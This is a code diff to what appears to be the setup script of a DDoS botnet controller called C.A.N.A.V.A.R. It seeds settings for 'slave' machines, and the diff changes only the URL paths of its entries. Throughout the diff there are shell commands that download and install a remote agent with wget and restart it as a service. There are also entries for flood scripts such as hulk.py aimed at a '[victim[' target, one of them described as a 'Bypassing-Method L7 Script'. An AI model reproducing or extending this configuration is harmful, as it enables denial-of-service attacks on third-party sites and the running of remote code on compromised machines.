@@ -52,8 +52,8 @@ setup.get().then(async (doc) => {
                 "download_agent": "cd /; mkdir [slaveNick[; cd [slaveNick[; wget [agentLink[; mkdir scripts;",
                 "download_modules": "npm install express fs axios events moment delay quick.db child_process systeminformation",
                 "scriptdir": "/[slaveNick[/scripts/",
-                "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
-                "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
+                "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/index.js",
+                "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/[serviceName[",
                 "slaveUpdate": "cd /[slaveNick[/; wget [agentLink[ -O index.js; systemctl restart [serviceName["
             }
         )
@@ -81,7 +81,7 @@ scripts_.get().then(async (doc) => {
                 "filename": "hulk.py",
                 "dictation": "python2 [scriptdir[hulk.py http://[victim[",
                 "description": "Basic L7 Script, Recommended",
-                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/hulk.py"
+                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/scripts/hulk.py"
             }
         )
         scripts_.doc("b98e97d8ba98b17c43f8b9ab1ad4837b").set(
@@ -92,7 +92,7 @@ scripts_.get().then(async (doc) => {
                 "filename": "custommatter.py",
                 "dictation": "python2 [scriptdir[custommatter.py [victim[",
                 "description": "Customized Bypassing-Method L7 Script",
-                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/custommatter.py"
+                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/scripts/custommatter.py"
             }
         )
     }
